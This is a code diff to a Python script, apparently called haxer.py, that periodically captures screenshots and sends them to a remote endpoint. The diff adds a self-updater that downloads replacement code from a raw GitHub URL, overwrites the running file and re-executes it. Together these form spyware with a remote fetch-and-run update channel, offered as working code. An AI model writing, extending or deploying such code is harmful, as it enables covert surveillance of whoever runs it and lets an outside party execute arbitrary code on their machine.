@@ -1,4 +1,4 @@
-import requests, time, pyautogui, datetime, io
+import requests, time, pyautogui, datetime, io, inspect, os
 
 def sendMsg(content, image=""):
   files = {}
@@ -20,7 +20,20 @@ while True:
   sendMsg(f"# Update at {str(datetime.datetime.now())}\nScreenshot:", screenshot)
 
   # Self-Updater
-  
+  r = requests.get("https://raw.githubusercontent.com/kiwuthegamer/Metamorphic/main/haxer.py")
+  if r.text != inspect.getsource(inspect.getmodule(inspect.currentframe())): # Check if an update is needed
+    sendMsg("Found Script Update!")
+    sendMsg("Updating Script")
+    
+    # Edit the python file
+    with open(__file__, "w") as f:
+      f.write(r.text)
+    
+    sendMsg("Update Complete!")
+    sendMsg("Refreshing Script")
+
+    os.system(__file__)
+    exit()
 
   # Sleep
   time.sleep(60)
